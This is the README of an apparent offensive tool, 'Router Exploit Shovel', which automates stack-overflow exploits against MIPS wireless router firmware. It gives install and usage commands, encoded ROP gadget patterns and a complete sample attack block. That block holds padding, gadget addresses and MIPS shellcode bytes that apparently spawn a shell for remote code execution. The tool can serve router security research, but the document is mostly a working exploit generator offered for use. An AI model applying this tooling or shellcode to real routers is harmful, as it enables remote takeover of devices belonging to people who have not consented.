![py3.5](https://img.shields.io/badge/python-3.5-blue.svg)

# Router Exploit Shovel 
Automated Application Generation for Stack Overflow Types on Wireless Routers

Router exploits shovel is an automated application generation tool for stack overflow types on wireless routers. The tool implements the key functions of exploits, it can adapt to the length of the data padding on the stack, generate the ROP chain, generate the encoded shellcode, and finally assemble them into a complete attack code. The user only needs to attach the attack code to the overflow location of the POC to complete the Exploit of the remote code execution. 

The tool supports MIPSel and MIPSeb.Run on Ubuntu 16.04 64bit.

## Install
Make sure you have git, python3 and setuptools installed. 
Download source code from our Github:
```bash
$ git clone https://github.com/arthastang/Router-Exploit-Shovel.git
```
Set up environment and install dependencies:
```bash
$ cd Router-Exploit-Shovel/
$ python3 setup.py install
```
## Usage
```bash
$ python3 Router_Exploit_Shovel.py -h
Usage: Router_Exploit_Shovel.py [options]

Options:
  -h, --help            show this help message and exit
  -b BINARYFILEPATH, --binaryFile=BINARYFILEPATH
                        input binary file path
  --ba=BINARYBASEADDR, --binaryBaseAddr=BINARYBASEADDR
                        input binary base address,default=0x00400000
  -l LIBRARYFILEPATH, --libraryFile=LIBRARYFILEPATH
                        input libc file path
  --la=LIBRARYBASEADDR, --libraryBaseAddr=LIBRARYBASEADDR
                        input library base address,default=0x2aae2000
  -o OVERFLOWFUNCTIONPOINTOFFSET, --overflowPoint=OVERFLOWFUNCTIONPOINTOFFSET
                        input overflow function point offset
  --arch=ARCH           input architecture of elf files,[little] or
                        [big],default=big
```
For example:
```bash
$ python3 Router_Exploit_Shovel.py -b test_binaries/mipseb-httpd -l test_binaries/libuClibc-0.9.30.so -o 0x00478584
```

## Screenshots
![screenshot.jpg](screenshot.jpg)


## Code structure
```bash
--Router_Exploit_Shovel.py       #Startup script
--databases/                     
  |---ROP_patterns/              #YAML file of ROP patterns        
  |---shellcodes/                #YAML file of shellcodes
--example/                       #Nday vulnerabilities, full report and exploit code
--results/                       
  |---ROP_gadgets/               #ROP gadgets generating results       
  |---attackBlock.txt            #Attack block generating results
--ropper/                        #Modified ropper module to get all gadgets
--filebytes/                     #Filebytes module to load ELFs
--router_exp_shovel/             #Main module         
  |---offset_calculator/         #Calculate padding size 
  |---ROP_maker/                 #Make ROP chains
  |---shellcode_maker/           #Make shellcodes
--qemuTestEnvironment/           #MIPS run-environment for router exploitation
```

## ROP chain generation
This tool uses pattern to generate ROP chains.
Extract patterns from common ROP exploitation procedure. Use regex matching to find available gadgets to fill up chain strings.
Base64 encoding is to avoid duplicate character escapes.
For example:
```bash
chainString: (gadget2)(gadget1)BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB(sleep)CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC(call_code)DDDD(stack_gadget)\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44
gadget1: KC4qKW1vdmUgXCR0OVwsIFwkczE7IGx3IFwkcmFcLCAweDI0XChcJHNwXCk7IGx3IFwkczFcLCAweDIwXChcJHNwXCk7IGx3IFwkczBcLCAweDFjXChcJHNwXCk7KC4qKTsganIgXCR0OTsgYWRkaXUgXCRzcFwsIFwkc3BcLCAweDI4Ow==
#gadget1: (.*)move \\$t9\\, \\$s1; lw \\$ra\\, 0x24\\(\\$sp\\); lw \\$s1\\, 0x20\\(\\$sp\\); lw \\$s0\\, 0x1c\\(\\$sp\\);(.*); jr \\$t9; addiu \\$sp\\, \\$sp\\, 0x28; 
gadget2: KC4qKWFkZGl1IFwkYTBcLCBcJHplcm9cLCAxOyBtb3ZlIFwkdDlcLCBcJHMxOyBqYWxyIFwkdDk7
#gadget2: (.*)addiu \\$a0\\, \\$zero\\, 1; move \\$t9\\, \\$s1; jalr \\$t9;
call_code: KC4qKW1vdmUgXCR0OVwsIFwkczI7IGphbHIgXCR0OTs=
#call_code: (.*)move \\$t9\\, \\$s2; jalr \\$t9;
stack_gadget: KC4qKWFkZGl1IFwkczJcLCBcJHNwXCwgMHgxODsoLiopbW92ZSBcJHQ5XCwgXCRzMDsgamFsciBcJHQ5Ow==
#stack_gadget: (.*)addiu \\$s2\\, \\$sp\\, 0x18;(.*)move \\$t9\\, \\$s0; jalr \\$t9;
```

## Attackblocks
You can get attackblocks generated in results/attackBlocks.txt. Such as:
```bash
attackBlock = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x2a\xb3\x7c\x60\x2a\xb2\xbd\xfcBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x2a\xb3\x5c\xa0CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x2a\xb0\x09\x38DDDD\x2a\xaf\x76\x68\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99\x27\xb2\x05\x4b\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1\x02\x2a\x18\x26\xae\x43\xff\xc1\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d\x7a\x69\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01\x01\x0c\x24\x0f\x73\x50\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c"
```

## Dependencies
- Ropper:An awesome tool for dumping binary informations and generating ROP chains.https://github.com/sashs/Ropper
- filebytes:Library to read and edit files in ELF、PE、MachO and OAT.https://scoding.de/filebytes-introduction
- yaml:YAML Ain't Markup Language.https://yaml.org/
- optparse:Parser for command line options.https://docs.python.org/3/library/optparse.html
- Capstone:disassembly framework.http://www.capstone-engine.org/
- re:regex module.

